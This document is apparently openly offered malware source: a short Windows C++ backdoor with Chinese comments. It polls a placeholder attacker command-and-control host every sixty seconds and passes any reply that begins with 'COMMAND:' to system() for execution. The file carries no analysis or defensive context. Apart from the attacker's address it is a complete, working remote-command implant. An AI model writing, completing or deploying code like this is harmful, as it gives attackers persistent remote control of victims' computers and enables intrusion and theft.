#include <windows.h>
#include <wininet.h>
#include <string>
#include <iostream>
#include <vector>

#pragma comment(lib, "wininet.lib")

std::string http_get(const std::string& url) {
    HINTERNET hInternet = InternetOpen("HTTP_GET", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hConnect = InternetOpenUrl(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);

    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "";
    }

    char buffer[4096];
    DWORD bytesRead;
    std::string response;

    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        response.append(buffer, bytesRead);
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return response;
}

void execute_command(const std::string& command) {
    system(command.c_str());
}

int main() {
    const std::string c2_url = "http://IP地址:8080/heartbeat";  //攻击者主机IP地址

    while (true) {
        std::string response = http_get(c2_url);

        if (!response.empty() && response.find("COMMAND:") == 0) {
            std::string command = response.substr(strlen("COMMAND:"));
            execute_command(command);
        }

        Sleep(60000); // 每60秒心跳一次
    }

    return 0;
}
